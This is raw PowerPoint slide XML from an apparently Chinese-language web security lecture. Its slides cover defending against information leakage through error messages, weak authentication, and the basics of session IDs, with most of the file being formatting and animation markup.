                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="469000" name="Text Box 8"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="200025" y="2882900"/>
            <a:ext cx="981075" cy="366713"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="46800" rIns="90000" bIns="46800">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>示例</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="469001" name="Text Box 9"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="900113" y="5300663"/>
            <a:ext cx="6911975" cy="822325"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="15875">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="46800" rIns="90000" bIns="46800" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>错误处理信息对于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Debug</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>非常有用，但是为攻击者提供了太多潜在可用的攻击信息！</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1">
              <a:solidFill>
                <a:srgbClr val="CC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68996"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="468996"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="46899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68999"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="468999"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="46899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68997"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="17" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="468997"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="18" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="46899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69000"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="21" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="469000"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="22" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="46900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69001"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="27" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="469001"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="28" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4690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6" grpId="0" animBg="1"/>
      <p:bldP spid="468997" grpId="0" animBg="1"/>
      <p:bldP spid="468999" grpId="0"/>
      <p:bldP spid="469000" grpId="0"/>
      <p:bldP spid="469001"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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、防御信息泄露</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="471043" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>每个应用程序都应包含一个标准的错误处理框架来处理异常：禁止显示堆栈跟踪、数据库访问、协议等相关的信息；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>程序应只提供尽量简短、“刚好够用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的错误处理信息给用户；</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1043">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="471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1043">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4710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r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0"/>
              <a:t>5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0"/>
              <a:t>、认证和会话管理不完善</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="421892"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a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Account credentials and session tokens are often not properly protected. Attackers compromise passwords, keys, or authentication tokens to assume other users’ identities.</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="421893" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="717695" y="133667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1892">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="42189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type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>会话</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>(Session)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>管理</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="472067" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="460519" y="1301316"/>
            <a:ext cx="8275637" cy="4865687"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP/HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>是“无状态”协议</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>意味着每一次用户请求都需要认证</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>会话管理解决了这样的问题：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>当一个用户得到服务器认证后，服务器如何识别和处理这个认证用户接下来的请求</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>程序一般会提供内置的会话跟踪方法，方便用户的使用；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>开发者常采用自己的策略来实现会话状态管理，可能会犯错误而导致安全问题。</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2067">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4720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20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2067">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4720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20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2067">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4720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20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2067">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4720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20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2067">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4720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20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72067">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="37" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="47206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20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zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>会话管理：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Session ID</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="473091" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="714375" y="1280102"/>
            <a:ext cx="8229600" cy="5203825"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>唯一地标识用户</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>一个</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>仅用于一次认证会话</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>由服务器生成</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>以如下的形式发送给客户端：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>隐式变量</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP cookie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>查询串</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>服务器期待用户在下一次请求时发送同样的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（用来标识用户已被认证）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3091">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4730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30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3091">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4730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30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3091">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4730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30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3091">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4730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30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3091">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4730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30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73091">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="37" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="47309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30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73091">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
